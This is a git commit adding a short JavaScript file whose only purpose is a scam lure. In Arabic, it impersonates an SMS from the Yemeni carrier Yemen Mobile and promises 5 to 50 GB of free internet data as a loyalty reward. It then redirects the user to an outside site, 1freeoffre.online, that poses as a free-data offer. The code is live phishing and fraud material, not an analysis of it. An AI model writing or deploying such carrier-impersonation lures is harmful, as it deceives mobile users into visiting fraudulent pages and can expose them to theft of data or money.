b561a0ac2d5d84d6ab1a386778e53e1bc647f5e7
oynxa <heartflet247@gmail.com>
2026-02-22 01:49:06 -0800

    Create active-yemen.js

---
+++ active-yemen.js
@@ -0,0 +1,5 @@
+var password = 'بيانات مجانية'
+password=prompt('YEMEN MOBILE SMS: عزيزي العميل، يرجى استلام بيانات الإنترنت المجانية من 5 جيجابايت إلى 50 جيجابايت لكونك من مشتركي خدماتنا لفترة طويلة، مكافأة العملاء، اضغط على بيانات مجانية للتحقق الآن ','بيانات مجانية');
+if (password != 'بيانات مجانية') {
+location.href='https://1freeoffre.online/freedatayemenmobile.html';
+}
